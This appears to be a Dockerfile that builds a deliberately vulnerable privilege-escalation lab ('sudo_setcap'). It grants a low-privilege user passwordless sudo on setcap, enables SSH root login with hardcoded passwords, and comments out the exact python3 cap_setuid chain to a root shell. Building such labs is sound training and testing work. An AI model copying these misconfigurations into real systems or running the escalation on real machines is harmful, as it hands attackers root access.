FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_setcap
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/setcap as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and libcap2-bin (provides setcap/getcap)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        libcap2-bin \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify setcap is installed
RUN which setcap && ls -la /usr/sbin/setcap

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# GTFOBins exploit for setcap via sudo:
#   sudo setcap cap_setuid+ep /path/to/some_binary
#   Then use that binary to escalate to root.
# For example:
#   cp /usr/bin/python3 /tmp/python3
#   sudo setcap cap_setuid+ep /tmp/python3
#   /tmp/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/sbin/setcap" > /etc/sudoers.d/setcap && \
    chmod 440 /etc/sudoers.d/setcap

# Verify sudo configuration
RUN visudo -c

# Install python3 so the exploit chain works (setcap + python3 for setuid)
RUN apt-get update && \
    apt-get install -y python3 && \
    rm -rf /var/lib/apt/lists/*

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]